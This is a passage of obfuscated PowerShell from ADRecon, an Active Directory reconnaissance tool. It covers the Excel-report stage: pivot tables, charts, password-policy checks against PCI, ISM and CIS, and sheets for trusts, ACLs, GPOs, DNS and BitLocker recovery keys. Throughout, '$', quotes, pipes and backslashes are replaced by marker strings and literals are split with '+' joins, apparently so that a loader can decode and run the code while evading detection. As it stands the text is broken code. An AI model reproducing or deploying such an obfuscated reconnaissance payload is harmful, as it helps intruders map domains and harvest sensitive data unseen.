    bLHPivotTable = bLHPivotCaches.CreatePivotTable(bLHPivotLocation,bLHPivotTableName)
    # bLHworkbook.ShowPivotTableFieldList = bLHtrue

    If (bLHPivotRows)
    {
        ForEach (bLHRow in bLHPivotRows)
        {
            bLHPivotField = bLHPivotTable.PivotFields(bLHRow)
            bLHPivotField.Orientation = [Microsoft.Office.Interop.Excel.XlPivotFieldOrientation]::xlRowField
        }
    }

    If (bLHPivotColumns)
    {
        ForEach (bLHCol in bLHPivotColumns)
        {
            bLHPivotField = bLHPivotTable.PivotFields(bLHCol)
            bLHPivotField.Orientation = [Microsoft.Office.Interop.Excel.XlPivotFieldOrientation]::xlColumnField
        }
    }

    If (bLHPivotFilters)
    {
        ForEach (bLHFil in bLHPivotFilters)
        {
            bLHPivotField = bLHPivotTable.PivotFields(bLHFil)
            bLHPivotField.Orientation = [Microsoft.Office.Interop.Excel.XlPivotFieldOrientation]::xlPageField
        }
    }

    If (bLHPivotValues)
    {
        ForEach (bLHVal in bLHPivotValues)
        {
            bLHPivotField = bLHPivotTable.PivotFields(bLHVal)
            bLHPivotField.Orientation = [Microsoft.Office.Interop.Excel.XlPivotFieldOrientation]::xlDataField
        }
    }

    If (bLHPivotPercentage)
    {
        ForEach (bLHVal in bLHPivotPercentage)
        {
            bLHPivotField = bLHPivotTable.PivotFields(bLHVal)
            bLHPivotField.Orientation = [Microsoft.Office.Interop.Excel.XlPivotFieldOrientation]::xlDataField
            bLHPivotField.Calculation = [Microsoft.Office.Interop.Excel.XlPivotFieldCalculation]::xlPercentOfTotal
            bLHPivotTable.ShowValuesRow = bLHfalse
        }
    }

    # bLHPivotFields.Caption = lEzjlEzj
    bLHexcel.ScreenUpdating = bLHtrue

    Get-ADRExcelComObjRelease -ComObjtoRelease bLHPivotField
    Remove-Variable PivotField
    Get-ADRExcelComObjRelease -ComObjtoRelease bLHPivotTable
    Remove-Variable PivotTable
    Get-ADRExcelComObjRelease -ComObjtoRelease bLHPivotCaches
    Remove-Variable PivotCaches
    Get-ADRExcelComObjRelease -ComObjtoRelease bLHSrcWorksheet
    Remove-Variable SrcWorksheet
}

Function Get-ADRExcelAttributeStats
{
<#
.SYNOPSIS
    Helper to add Attribute Stats to the current WorkSheet.

.DESCRIPTION
    Helper to add Attribute Stats to the current WorkSheet.

.PARAMETER SrcSheetName
    [string]
    Source Sheet Name.

.PARAMETER Title1
    [string]
    Title1.

.PARAMETER PivotTableName
    [string]
    PivotTableName.

.PARAMETER PivotRows
    [string]
    PivotRows.

.PARAMETER PivotValues
    [string]
    PivotValues.

.PARAMETER PivotPercentage
    [string]
    PivotPercentage.

.PARAMETER Title2
    [string]
    Title2.

.PARAMETER ObjAttributes
    [OrderedDictionary]
    Attributes.
#>
    param (
        [Parameter(Mandatory = bLHtrue)]
        [string] bLHSrcSheetName,

        [Parameter(Mandatory = bLHtrue)]
        [string] bLHTitle1,

  '+'      [Parameter(Mandatory = bLHtrue)]
        [string] bLHPivotTableName,

        [Parameter(Mandatory = bLHtrue)]
        [string] bLHPivotRows,

        [Parameter(Mandatory = bLHtrue)]
        [string] bLHPivotValues'+',

        [Parameter(Mandatory = bLHtrue)]
        [string] bLHPivotPercentage,

        [Parameter(Mandatory = bLHtrue)]
        [string] bLHTitle2,

        [Parameter(Mandatory = bLHtrue)]
        [System.Object] bLHObjAttributes
    )

    bLHexcel.ScreenUpdating = bLHfalse
    bLHworksheet = bLHworkbook.Worksheets.Item(1)
    bLHSrcWorksheet = bLHworkbook.Sheets.Item(bLHSrcSheetName)

    bLHrow = 1
    bLHcolumn = 1
    bLHworksheet.Cells.Item(bLHrow, bLHcolumn) = bLHTitle1
    bLHworksheet.Cells.Item(bLH'+'row,bLHcolumn).Style = lEzjHeading 2lEzj
    bLHworksheet.Cells.Item(bLHrow,bLHcolumn).HorizontalAlignment = -4108
    bLHMergeCells = bLHworksheet.Range(lEzjA1:C1lEzj)
    bLHMergeCells.Select() 0Ogv Out-Null
    bLHMergeCells.MergeCells = bLHtrue
    Remove-Variable MergeCells

    Get-ADRExcelPivotTable -SrcSheetName bLHSrcSheetName -PivotTableName bLHPivotTableName -PivotRows @(bLHPivotRows) -PivotValues @(bLHPivotValues) -PivotPercentage @(bLHPivotPercentage) -PivotLocation lEzjR2C1lEzj
    bLHexcel.ScreenUpdating = bLHfalse

    bLHrow = 2
    lEzjTypelEzj,lEzjCountlEzj,lEzjPercentagelEzj 0Ogv ForEach-Object {
        bLHworksheet.Cells.Item(bLHrow, bLHcolumn) = bLH_
        bLHworksheet.Cells.Item(bLHrow, bLHcolumn).Font.Bold = bLHTrue
        bLHcolumn++
    }

    bLHrow = 3
    bLHcolumn = 1
    For(bLHrow = 3; bLHrow -le 6; bLHrow++)
    {
        bLHtemptext = [string] bLHworksheet.Cells.Item(bLHrow, bLHcolumn).Text
        switch (bLHtemptext.ToUpper())
        {
            lEzjTRUElEzj { bLHworksheet.Cells.Item(bLHrow, bLHcolumn) = lEzjEnabledlEzj }
            lEzjFALSElEzj { bLHworksheet.Cells.Item(bLHrow, bLHcolumn) = lEzjDisabledlEzj }
            lEzjGRAND TOTALlEzj { bLHworksheet.Cells.Item(bLHrow, bLHcolumn) = lEzjTotallEzj }
        }
    }

    If (bLHObjAttributes)
    {
        bLHrow = 1
        bLHcolumn = 6
        bLHworksheet.Cells.Item(bLHrow, bLHcolumn) = bLHTitle2
        bLHworksheet.Cells.Item(bLHrow,bLHcolumn).Style = lEzjHeading 2lEzj
        bLHworksheet.Cells.Item(bLHrow,bLHcolumn).HorizontalAlignment = -4108
        bLHMergeCells = bLHworksheet.Range(lEzjF1:L1lEzj)
        bLHMergeCells.Select() 0Ogv Out-Null
        bLHMergeCells.MergeCells = bLHtrue
        Remove-Variable MergeCells

        bLHrow++
        lEzjCategorylEzj,lEzjEnabled CountlEzj,lEzjEnabled PercentagelEzj,lEzjDisabled CountlEzj,lEzjDisabled PercentagelEzj,lEzjTotal CountlEzj,lEzjTotal PercentagelEzj 0Ogv ForEach-Object {
            bLHworksheet.Cells.Item(bLHrow, bLHcolumn) = bLH_
            bLHworksheet.Cells.Item(bLHrow, bLHcolumn).Font.Bold = bLHTrue
            bLHcolumn++
        }
        bLHExcelColumn = (bLHSrcWorksheet.Col'+'umns.Find(lEzjEnabledlEzj))
        bLHEnabledColAddress = lEzjbLH(bLHExcelColumn.Address(bLHfalse,bLHfalse).Substring(0,bLHExcelColumn.Address(bLHfalse,bLHfalse).Length-1)):bLH(bLHExcelColumn.Address(bLHfalse,bLHfalse).Substring(0,bLHExcelColumn.Address(bLHfalse,bLHfalse).Length-1))lEzj
        bLHcolumn = 6
        bLHi = 2

        bLHObjAttributes.keys 0Ogv ForEach-Object {
            bLHExcelColumn = (bLHSrcWorksheet.Columns.Find(bLH_))
            bLHColAddress = lEzjbLH(bLHExcelColumn.Address(bLHfalse,bLHfalse).Substring(0,bLHExcelColumn.Address(bLHfalse,bLHfalse).Length-1)):bLH(bLHExcelColumn.Address(bLHfalse,bLHfalse).Substring(0,bLHExcelColumn.Address(bLHfalse,bLHfalse).Length-1))lEzj
            bLHrow++
            bLHi++
            If (bLH_ -eq lEzjDelegation Ty'+'plEzj)
            {
                bLHworksheet.Cells.Item(bLHrow, bLHcolumn) = lEzjUnconstrained DelegationlEzj
            }
            ElseIf (bLH_ -eq lEzjDelegation TypelEzj)
            {
                bLHworksheet.Cells.Item(bLHrow, bLHcolumn) = lEzjConstrained DelegationlEzj
            }
            Else
         '+'   {
                bLHworksheet.Cells.Item(bLHrow, bLHcolumn).Formula = lEzj=xfJ4lEzj + bLHSrcWorksheet.Name + lEzjxfJ4!lEzj + bLHExcelColumn.Address(bLHfalse,bLHfalse)
            }
            bLHworksheet.Cells.Item(bLHrow, bLHcolumn+1).Formula = lEzj=COUNTIFS(xfJ4lEzj + bLHSrcWorksheet.Name + lEzjxfJ4!lEzj + bLHEnabledColAddress + xfJ4,lEzjTRUElEzj,xfJ4 + lEzjxfJ4lEzj + bLHSrcWorksheet.Name + lEzjxfJ4!lEzj + bLHColAddress + xfJ4,xfJ4 + bLHObjAttributes[bLH_] + xfJ4)xfJ4
            bLHworksheet.Cells.Item(bLHrow, bLHcolumn+2).Formula = xfJ4=IFERROR(GxfJ4 + bLHi + xfJ4/VLOOKUP(lEzjEnabledlEzj,A3:B6,2,FALSE),0)xfJ4
            bLHworksheet.Cells.Item(bLHrow, bLHcolumn+3).Formula = lEzj=COUNTIFS(xfJ4lEzj + bLHSrcWorksheet.Name + lEzjxfJ4!lEzj + bLHEnabledColAddress + xfJ4,lEzjFALSElEzj,xfJ4 + lEzjxfJ4lEzj + bLHSrcWorksheet.Name + lEzjxfJ4!lEzj + bLHColAddress + xfJ4,xfJ4 + bLHObjAttributes[bLH_] + xfJ4)xfJ4
            bLHworksheet.Cells.Item(bLHrow, bLHcolumn+4).Formula = xfJ4=IFERROR(IxfJ4 + bLHi + xfJ4/VLOOKUP(lEzjDisabledlEzj,A3:B6,2,FALSE),0)xfJ4
            If ( (bLH_ -eq lEzjSIDHistorylEzj) -or (bLH_ -eq lEzjms-ds-CreatorSidlEzj) )
            {
                # Remove count of FieldName
                bLHworksheet.Cells.Item(bLHrow, bLHcolumn+5).Formula = lEzj=COUNTIF(xfJ4lEzj + bLHSrcWorksheet.Name + lEzjxfJ4!lEzj + bLHColAddress + xfJ4,xfJ4 + bLHObjAttributes[bLH_] + xfJ4)-1xfJ4
            }
            Else
            {
                bLHworksheet.Cells.Item(bLHrow, bLHcolumn+5).Formula = lEzj=COUNTIF(xfJ4lEzj + bLHSrcWorksheet.Name + lEzjxfJ4!lEzj + bLHColAddress + xfJ4,xfJ4 + bLHObjAttributes[bLH_] + xfJ4)xfJ4
            }
            bLHworksheet.Cells.Item(bLHrow, bLHcolumn+6).Formula = xfJ4=IFERROR(KxfJ4 + bLHi + xfJ4/VLOOKUP(lEzjTotallEzj,A3:B6,2,FALSE),0)xfJ4
        }

        # http://www.excelhowto.com/macros/formatting-a-range-of-cells-in-excel-vba/
        lEzjHlEzj, lEzjJlEzj , lEzjLlEzj 0Ogv ForEach-Object {
            bLHrng = bLH_ + bLH(bLHrow - bLHObjAttributes.Count + 1) + lEzj:lEzj + bLH_ + bLH(bLHrow)
            bLHworksheet.Range(bLHrng).NumberFormat = lEzj0.00%lEzj
        }
    }
    bLHexcel.ScreenUpdating = bLHtrue

    Get-ADRExcelComObjRelease -ComObjtoRelease bLHSrcWorksheet
    Remove-Variable SrcWorksheet
    Get-ADRExcelComObjRelease -ComObjtoRelease bLHworksheet
    Remove-Variable worksheet
}

Function Get-ADRExcelChart
{
<#
.SYNOPSIS
    Helper to add charts to the current WorkSheet.

.DESCRIPTION
    Helper to add charts to the current WorkSheet.

.PARAMETER ChartType
    [int]
    Chart Type.

.PARAMETER ChartLayout
    [int]
    Chart Layout.

.PARAMETER ChartTitle
    [string]
    Title of the Chart.

.PARAMETER RangetoCover
    WorkSheet Range to be covered by the Chart.

.PARAMETER ChartData
    Data for the Chart.

.PARAMETER StartRow
    Start row to calculate data for the Chart.

.PARAMETER StartColumn
    Start column to calculate data for the Chart.
#>
    param (
        [Parameter(Mandatory = bLHtrue)]
        [string] bLHChartType,

        [Parameter(Mandatory = bLHtrue)]
        [int] bLHChartLayout,

        [Parameter(Mandatory = bLHtrue)]
        [string] bLHChartTitle,

        [Parameter(Mandatory = bLHtrue)]
        bLHRangetoCover,

        [Parameter(Mandatory = bLHfalse)]
        bLHChartData = bLHnull,

        [Parameter(Mandatory = bLHfalse)]
        bLHStartRow = bLHnull,

        [Parameter(Mandatory = bLHfalse)]
        bLHStartColumn = bLHnull
    )

    bLHexcel.ScreenUpdating = bLHfalse
    bLHexcel.DisplayAlerts = bLHfalse
    bLHworksheet = bLHworkbook.Worksheets.Item(1)
    bLHchart = bLHworksheet.Shapes.AddChart().Chart
    # https://msdn.microsoft.com/en-us/vba/excel-vba/articles/xlcharttype-enumeration-excel
    bLHchart.chartType = [int]([Microsoft.Office.Interop.Excel.XLChartType]::bLHChartType)
    bLHchart.ApplyLayout(bLHChartLayout)
    If (bLHnull -eq bLHChartData)
    {
        If (bLHnull -eq bLHStartRow)
        {
            bLHstart = bLHworksheet.Range(lEzjA1lEzj)
        }
        Else
        {
            bLHstart = bLHworksheet.Range(bLHStartRow)
        }
        # get the last cell
        bLHX = bLHworksheet.Range(bLHstart,bLHstart.End([Microsoft.Office.Interop.Exc'+'el.XLDirection]::xlDown))
        If (bLHnull -eq bLHStartColumn)
        {
            bLHstart = bLHworksheet.Range(lEzjB1lEzj)
        }
        Else
        {
            bLHstart = bLHworksheet.Range(bLHStartColumn)
        }
        # get the last cell
        bLHY = bLHworksheet.Range(bLHstart,bLHstart.End([Mic'+'rosoft.Office.Interop.Excel.XLDirection]::xlDown))
        bLHChartData = bLHworksheet.Range(bLHX,bLHY)

        Get-ADRExcelComObjRelease -ComObjtoRelease bLHX
        Remove-Variable X
        Get-ADRExcelComObjRelease -ComObjtoRelease bLHY
        Remove-Variable Y
        Get-ADRExcelComObjRelease -ComObjtoRelease bLHstart
        Remove-Variable start
    }
    bLHchart.SetSourceData(bLHChartData)
    # https://docs.microsoft.com/en-us/dotnet/api/microsoft.office.interop.excel.chartclass.plotby?redirectedfrom=MSDN&view=excel-pia#Microsoft_Office_Interop_Excel_ChartClass_PlotBy
    bLHchart.PlotBy = [Microsoft.Office.Interop.Excel.XlRowCol]::xlColumns
    bLHchart.seriesCollection(1).Select() 0Ogv Out-Null
    bLHchart.SeriesCollection(1).ApplyDataLabels() 0Ogv out-Null
    # modify the chart title
    bLHchart.HasTitle = bLHTrue
    bLHchart.ChartTitle.Text = bLHChartTitle
    # Reposition the Chart
    bLHtemp = bLHworksheet.Range(bLHRangetoCover)
    # bLHchart.parent.placement = 3
    bLHchart.parent.top = bLHtemp.Top
    bLHchart.parent.left = bLHtemp.Left
    bLHchart.parent.width = bLHtemp.Width
    If (bLHChartTitle -ne lEzjPrivileged Groups in ADlEzj)
    {
        bLHchart.parent.height = bLHtemp.Height
    }
    # bLHchart.Legend.Delete()
    bLHexcel.ScreenUpdating = bLHtrue
    bLHexcel.DisplayAlerts = bLHtrue

    Get-A'+'DRExcelComObjRelease -ComObjtoRelease bLHchart
    Remove-Variable chart
    Get-ADRExcelComObjRelease -ComObjtoRelease bLHChartData
    Remove-Variable ChartData
    Get-ADRExcelComObjRelease -ComObjtoRelease bLHtemp
    Remove-Variable temp
    Get-ADRExcelComObjRelease -ComObjtoRelease bLHworksheet
    Remove-Variable worksheet
}

Function Get-ADRExcelSort
{
<#
.SYNOPSIS
    Sorts a WorkSheet in the active Workbook.

.DESCRIPTION
    Sorts a WorkSheet in'+' the active Workbook.

.PARAMETER ColumnName
    [string]
    Name of the Column.
#>
    param (
        [Parameter(Mandatory = bLHtrue)]
        [string] bLHColumnName
    )

    bLHworksheet = bLHworkbook.Worksheets.Item(1)
    bLHworksheet.Activate();

    bLHExcelColumn = (bLHworksheet.Columns.Find(bLHColumnName))
    If (bLHExcelColumn)
    {
        If (bLHExcelColumn.Text -ne bLHColumnName)
        {
            bLHBeginAddress = bLHExcelColumn.Address(0,0,1,1)
            bLHEnd = bLHFalse
            Do {
                #Write-Verbose lEzj[Get-ADRExcelSort] bLH(bLHExcelColumn.Text) selected instead of bLH(bLHColumnName) in the bLH(bLHworksheet.Name) worksheet.lEzj
                bLHExcelColumn = (bLHworksheet.Columns.FindNext(bLHExcelColumn))
                bLHAddress = bLHExcelColumn.Address(0,0,1,1)
                If ( (bLHAddress -eq bLHBeginAddress) -or (bLHExcelColumn.Text -eq bLHColumnName) )
                {
                    bLHEnd = bLHTrue
                }
            } Until (bLHEnd -eq bLHTrue)
        }
        If (bLHExcelColumn.Text -eq bLHColumnName)
        {
            # Sort by Column
            bLHworkSheet.ListObjects.Item(1).Sort.SortFields.Clear()
            bLHworkSheet.ListObjects.Item(1).Sort.SortFields.Add(bLHExcelColumn) 0Ogv Out-Null
            bLHworksheet.ListObjects.'+'Item(1).Sort.Apply()
        }
        Else
        {
            Write-Verbose lEzj[Get-ADRExcelSort] bLH(bLHColumnName) not found in the bLH(bLHworksheet.Name) worksheet.lEzj
        }
    }
    Else
    {
        Write-Verbose lEzj[Get-ADRExcelSort] bLH(bLHColumnName) not found in the bLH(bLHworksheet.Name) worksheet.lEzj
    }
    Get-ADRExcelComObjRelease -ComObjtoRelease bLHworksheet
    Remove-Variable worksheet
}

Function Export-ADRExcel
{
<#
.SYNOPSIS
    Automates the '+'generation of the ADRecon report.

.DESCRIPTION
    Au'+'tomates the generation of the ADRecon report. If specific files exist, they are imported into the ADRecon report.

.PARAMETER ExcelPath
    [string]
    Path for ADRecon output folder containing the CSV files to generate the ADRecon-Report.xlsx

.OUTPUTS
    Creates the ADRecon-Report.xlsx report in the folder.
#>
    param(
        [Parameter(Mandatory = bLHtrue)]
        [string] bLHExcelPath
    )

    bLHExcelPath = bLH((Convert-Path bLHExcelPath).TrimEnd(lEzjcnIlEzj))
    bLHReportPath = -join(bLHExcelPath,xfJ4cnIxfJ4,xfJ4CSV-FilesxfJ4)
    If (!(Test-Path bLHReportPath))
    {
        Wri'+'te-Warning lEzj[Export-ADRExcel] Could not locate the CSV-Files directory ... ExitinglEzj
        Write-Verbose lEzj[EXCEPTION] bLH(bLH_.Exception.Message)lEzj
        Return bLHnull
    }
    Get-ADRExcelComObj
    If (bLHexcel)
    {
        Write-Output lEzj[*] Generating ADRecon-Report.xlsxlEzj

        bLHADFileName = -join(bLHReportPath,xfJ4cnIxfJ4,xfJ4AboutADRecon.csvxfJ4)
        If (Test-Path bLHADFileName)
        {
            Get-ADRExcelImport -ADFileName bLHADFileName
            Remove-Variable ADFileName

            bLHworkbook.Worksheets.Item(1).Name = lEzjAbout ADReconlEzj
            bLHworkbook.Worksheets.Item(1).Hyperlinks.Add(bLHworkbook.Worksheets.Item(1).Cells.Item(3,2) , lEzjhttps://github.com/adrecon/ADReconlEzj, lEzjlEzj , lEzjlEzj, lEzjgithub.com/adrecon/ADReconlEzj) 0Ogv Out-Null
            bLHworkbook.Worksheets.Item(1).UsedRange.EntireColumn.AutoFit() 0Ogv Out-Null
        }

        bLHADFileName = -join(bLHReportPath,xfJ4cnIxfJ4,xfJ4Forest.csvxfJ4)
        If (Test-Path bLHADFileName)
        {
            Get-ADRExcelWorkbook -Name lEzjForestlEzj
            Get-ADRExcelImport -ADFileName bLHADFileName
            Remove-Variable ADFileName
        }

        bLHADFileName = -join(bLHReportPath,xfJ4cnIxfJ4,xfJ4Domain.csvxfJ4)
        If (Test-Path bLHADFileName)
        {
            Get-ADRExcelWorkbook -Name lEzjDomainlEzj
            Get-ADRExcelImport -ADFileName bLHADFileName
            bLHDomainObj = Import-CSV -Path bLHADFileName
            Remove-Variable ADFileName
            bLHDomainName = -join(bLHDomainObj[0].Value,lEzj-lEzj)
            Remove-Variable DomainObj
        }

        bLHADFileName = -join(bLHReportPath,xfJ4cnIxfJ4,xfJ4Trusts.csvxfJ4)
        If (Test-Path bLHADFileName)
        {
            Get-ADRExcelWorkbook -Name lEzjTrustslEzj
            Get-ADRExcelImport -ADFileName bLHADFileName
            Remove-Variable ADFileName
        }

        bLHADFileName = -join(bLHReportPath,xfJ4cnIxfJ4,xfJ4Subnets.csvxfJ4)
        If (Test-Path bLHADFileName)
        {
            Get-ADRExcelWorkbook -Name lEzjSubnetslEzj
            Get-ADRExcelImpor'+'t -ADFileName bLHADFileName
            Remove-Variable ADFileName
        }

        bLHADFileName = -join(bLHReportPath,xfJ4cnIxfJ4,xfJ4Sites.csvxfJ4)
        If (Test-Path bLHADFileName)
        {
            Get-ADRExcelWorkbook -Name lEzjSiteslEzj
            Get-ADRExcelImport -ADFileName bLHADFileName
            Remove-Variable ADFileName
        }

        bLHADFileName = -join(bLHReportPath,xfJ4cnIxfJ4,xfJ4SchemaHistory.csvxfJ4)
        If (Test-Path bLHADFileName)
        {
            Get-ADRExcelWorkbook -Name lEzjSchemaHistorylEzj
            Get-ADRExcelImport -ADFileName bLHADFileName
            Remove-Variable ADFileName
        }

        bLHADFileName = -join(bLHRe'+'portPath,xfJ4cnIxfJ4,xfJ4FineGrainedPasswordPolicy.csvxfJ4)
        If (Test-Path bLHADFileName)
        {
            Get-ADRExcelWorkbook -Name lEzjFine Grained Password PolicylEzj
            Get-ADRExcelImport -ADFileName bLHADFileName
            Remove-Variable ADFileName
        }

        bLHADFileName = -join(bLHReportPath,xfJ4cnIxfJ4,xfJ4DefaultPasswordPolicy.csvxfJ4)
        If (Test-Path bLHADFileName)
        {
            Get-ADRExcelWorkbook -Name lEzjDefault Password PolicylEzj
            Get-ADRExcelImport -ADFileName bLHADFileName
            Remove-Variable ADFileName

            bLHexcel.ScreenUpdating = bLHfalse
            bLHworksheet = bLHworkbook.Worksheets.Item(1)
            # https://docs.microsoft.com/en-us/office/vba/api/excel.xlhalign
            bLHworksheet.Range(lEzjB2:G10l'+'Ezj).HorizontalAlignment = -4108
            # https://docs.microsoft.com/en-us/office/vba/api/excel.range.borderaround

            lEzjA2:B10lEzj, lEzjC2:D10lEzj, lEzjE2:F10lEzj, lEzjG2:G10lEzj 0Ogv ForEach-Object {
                bLHworksheet.Range(bLH_).BorderAround(1) 0Ogv Out-Null
            }

            # https://docs.microsoft.com/en-us/dotnet/api/microsoft.office.interop.excel.formatconditions.add?view=excel-pia
            # bLHworksheet.'+'Range().FormatConditions.Add
            # http://dmcritchie.mvps.org/excel/colors.htm
            # Values for Font.ColorIndex

            bLHObjValues = @(
            # PCI Enforce password history (passwords)
            lEzjC2lEzj, xfJ4=IF(B2<4,TRUE, FALSE)xfJ4

            # PCI Maximum password age (days)
            lEzjC3lEzj, xfJ4=IF(OR(B3=0,B3>90),TRUE, FALSE)xfJ4

            # PCI Minimum password age (days)

            # PCI Minimum password length (characters)
            lEzjC5lEzj, xfJ4=IF(B5<7,TRUE, FALSE)xfJ4

            # PCI Password must meet complexity requirements
            lEzjC6lEzj, xfJ4=IF(B6<>TRUE,TRUE, FALSE)xfJ4

            # PCI Store password using reversible encryption for all users in the domain

            # PCI Account lockout d'+'uration (mins)
            lEzjC8lEzj, xfJ4=IF(AND(B8>=1,B8<30),TRUE, FALSE)xfJ4

            # PCI Account lockout threshold (attempts)
            lEzjC9lEzj, xfJ4=IF(OR(B9=0,B9>6),TRUE, FALSE)xfJ4

            # PCI Reset account lockout counter after (mins)

            # ASD ISM Enforce password history (passwords)
            lEzjE2lEzj, xfJ4=IF(B2<8,TRUE, FALSE)xfJ4

            # ASD ISM Maxi'+'mum password age (days)
            lEzjE3lEzj, xfJ4=IF(OR(B3=0,B3>90),TRUE, FALSE)xfJ4

            # ASD ISM Minimum password age (days)
            lEzjE4lEzj, xfJ4=IF(B4=0,TRUE, FALSE)xfJ4

            # ASD ISM Minimum password length (characters)
            lEzjE5lEzj, xfJ4=IF(B5<13,TRUE, FALSE)xfJ4

            # ASD ISM Password must meet complexity requirements
            lEzjE6lEzj, xfJ4=IF(B6<>TRUE,TRUE, FALSE)xfJ4

            # ASD ISM Store password using reversible encryption for all users in the domain

            # ASD ISM Account lockout duration (mins)

            # ASD ISM Account lockout threshold (attempts)
            lEzjE9lEzj, xfJ4=IF(OR(B9=0,B9>5),TRUE, FALSE)xfJ4

            # ASD ISM Reset account lockout counter after (mins)

            # CIS Benchmark Enforce password history (passwords)
            lEzjG2lEzj, xfJ4=IF(B2<24,TRUE, FALSE)xfJ4

            # CIS Benchmark Maximum password age (days)
            lEzjG3lEzj, xfJ4=IF(OR(B3=0,B3>60),TRUE, FALSE)xfJ4

            # CIS Benchmark Minimum password age (days)
            lEzjG4lEzj, xfJ4=IF(B4=0,TRUE, FALSE)xfJ4

            # CIS Benchmark Minimum password length (characters)
            lEzjG5lEzj, xfJ4=IF(B5<14,TRUE, FALSE)xfJ4

            # CIS Benchmark Password must meet'+' complexity requirements
            lEzjG6lEzj, xfJ4=IF(B6<>TRUE,TRUE, FALSE)xfJ4

            # CIS Benchmark Store password using reversible encryption for all users in the domain
            lEzjG7lEzj, xfJ4=IF(B7<>FALSE,TRUE, FALSE)xfJ4

            # CIS Benchmark Account lockout duration (mins)
            lEzjG8lEzj, xfJ4=IF(AND(B8>=1,B8<15),TRUE, FAL'+'SE)xfJ4

            # CIS Benchmark Account lockout threshold (attempts)
            lEzjG9lEzj, xfJ4=IF(OR(B9=0,B9>10),TRUE, FALSE)xfJ4

            # CIS Benchmark Reset account lockout counter after (mins)
            lEzjG10lEzj, xfJ4=IF(B10<15,TRUE, FALSE)xfJ4 )

            For (bLHi = 0; bLHi -lt bLH(bLHObjValues.Count); bLHi++)
            {
                bLHworksheet.Range(bLHObjValues[bLHi]).FormatConditions.Add([Microsoft.Office.Interop.Excel.XlFormatConditionType]::xlExpression, 0, bLHObjValues[bLHi+1]) 0Ogv Out-Null
                bLHi++
            }

            lEzjC2lEzj, lEzjC3lEzj , lEzjC5lEzj, lEzjC6lEzj, lEzjC8lEzj, lEzjC9lEzj, lEzjE2lEzj, lEzjE3lEzj , lEzjE4lEzj, lEzjE5lEzj, lEzjE6lEzj, lEzjE9lEzj, lE'+'zjG2lEzj, lEzjG3lEzj, lEzjG4lEzj, lEzjG5lEzj, lEzjG6lEzj, lEzjG7lEzj, lEzjG8lEzj, lEzjG9lEzj, lEzjG10lEzj 0Ogv ForEach-Object {
                bLHworksheet.Range(bLH_).FormatConditions.Item(1).StopIfTrue = bLHfalse
                bLHworksheet.Range(bLH_).FormatConditions.Item(1).Font.ColorIndex = 3
            }

            bLHworkbook.Worksheets.Item(1).Hyperlinks.Add(bLHworkbook.Worksheets.Item(1).Cells.Item(1,4) , lEzjhttps://www.pcisecuritystandards.org/document_library?category=pcidss&document=pci_dsslEzj, lEzjlEzj , lEzjlEzj, lEzjPCI DSS v3.2.1lEzj) 0Ogv Out-Null
            bLHworkbook.Worksheets.Item(1).Hyperlinks.Add(bLHworkbook.Worksheets.Item(1).Cells.Item(1,6) , lEzjhttps://acsc.gov.au/infosec/ism/lEzj, lEzjlEzj , lEzjlEzj, lEzj2018 ISM ControlslEzj) 0Ogv Out-Null
            bLHworkbook.Worksheets.Item(1).Hyperlinks.Add(bLHworkbook.Worksheets.Item(1).Cells.Item(1,7) , lEzjhttps://www.cisecurity.org/benchmark/microsoft_windows_server/lEzj, lEzjlEzj , lEzjlEzj, lEzjCIS Benchmark 2016lEzj) 0Ogv Out-Null

            bLHexcel.ScreenUpdating = bLHtrue
            Get-ADRExcelComObjRelease -ComObjtoRelease bLHworksheet
            Remove-Variable worksheet
        }

        bLHADFileName = -join(bLHReportPath,xfJ4cnIxfJ4,xfJ4DomainControllers.csvxfJ4)
        If (Test-Path bLHADFileName)
        {
            Get-ADRExcelWorkbook -Name lEzjDomain ControllerslEzj
            Get-ADRExcelImport -ADFileName bLHADFileName
            Remove-Variable ADFileName
        }

        bLHADFileName = -join(bLHReportPath,xfJ4cnIxfJ4,xfJ4GroupChanges.csvxfJ4)
        If (Test-Path bLHADFileName)
        {
            Get-ADRExcelWork'+'book -Name lEzjGroup ChangeslEzj
            Get-ADRExcelImport -ADFileName bLHADFileName
            Remove-Variable ADFileName

            Get-ADRExcelSort -ColumnName lEzjGroup NamelEzj
        }

        bLHADFileName = -join(bLHReportPath,xfJ4cnIxfJ4,xfJ4DACLs.csvxfJ4)
        If (Test-Path bLHADFileName)
        {
            Get-ADRExcelWorkbook -Name lEzjDACLslEzj
            Get-ADRExcelImport -ADFileName bLHADFileName
            Remove-Variable ADFileName
        }

'+'        bLHADFileName = -join(bLHReportPath,xfJ4cnIxfJ4,xfJ4SACLs.csvxfJ4)
        If (Test-Path bLHADFi'+'leName)
        {
            Get-ADRExcelWorkbook -Name lEzjSACLslEzj
            Get-ADRExcelImport -ADFileName bLHADFileName
            Remove-Variable ADFileName
        }

        bLHADFileName = -join(bLHReportPath,xfJ4cnIxfJ4,xfJ4GPOs.csvxfJ4)
        If (Test-Path bLHADFileName)
        {
            Get-ADRExcelWorkbook -Name lEzjGPOslEzj
            Get-ADRExcelImport -ADFileName bLHADFileName
            Remove-Variable ADFileName
        }

        bLHADFileName = -join(bLHReportPath,xfJ4cnIxfJ4,xfJ4gPLinks.csvxfJ4)
        If (Test-Path bLHADFileName)
        {
            Get-ADRExcelWorkbook -Name lEzjgPLinkslEzj
            Get-ADRExcelImport -ADFileName bLHADFileName
   '+'         Remove-Variable ADFileName
        }

        bLHADFileName = -join(bLHReportPath,xfJ4cnIxfJ4,xfJ4DNSNodesxfJ4,xfJ4.csvxfJ'+'4)
        If (Test-Path bLHADFileName)
        {
            Get-ADRExcelWorkbook -Name lEzjDNS RecordslEzj
            Get-ADRExcelImport -ADFileName bLHADFileName
            Remove-Variable ADFileName
        }

        bLHADFileName = -join(bLHReportPath,xfJ4cnIxfJ4,xfJ4DNSZones.csvxfJ4)
        If (Test-Path bLHADFileName)
        {
            Get-ADRExcelWorkbook -Name lEzjDNS ZoneslEzj
            Get-ADRExcelImport -ADFileName bLHADFileName
            Remove-Variable ADFileName
        }

        bLHADFileName = -join(bLHReportPath,xfJ4cnIxfJ4,xfJ4Printers.csvxfJ4)
        If (Test-Path bLHADFileName)
        {
            Get-ADRExcelWorkbook -Name lEzjPrinterslEzj
            Get-ADRExcelImport -ADFileName bLHADFileName
            Remove-Variable ADFileName
        }

        bLHADFileName = -join(bLHReportPath,xfJ4cnIxfJ4,xfJ4BitLockerRecoveryKeys.csvxfJ4)
        If (Test-Path bLHADFileName)
        {
            Get-ADRExcelWorkbook -Name lEzjBitLockerlEzj
            Get-ADRExcelImport -ADFileName bLHADFileName
            Remove-Variable ADFileName
        }

